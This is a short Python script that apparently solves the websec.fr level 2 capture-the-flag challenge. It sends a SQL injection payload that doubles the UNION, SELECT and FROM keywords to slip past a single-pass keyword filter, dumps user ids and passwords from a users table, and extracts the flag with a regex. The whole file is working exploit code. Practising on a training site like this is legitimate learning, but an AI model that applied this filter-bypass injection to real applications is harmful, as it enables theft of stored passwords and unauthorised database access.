#!/usr/bin/python3

import requests
import re

# DEFAULT INFO

url = "https://websec.fr:443/level02/index.php"

pattern = "(?<=value=\")(.*)(?=\">)"
flag_pattern = "(?<=WEBSEC{)(.*)(?=})"

s = requests.Session()

# CHALLENGE 

payload = "0 UUNIONNION SSELECTELECT id,password FFROMROM users--"

data = {"user_id": payload, 
        "submit": "Enviar"}

submit = s.post(url, data=data)

flag = "WEBSEC{" + re.search(flag_pattern, submit.text)[0] + "}"
print(flag)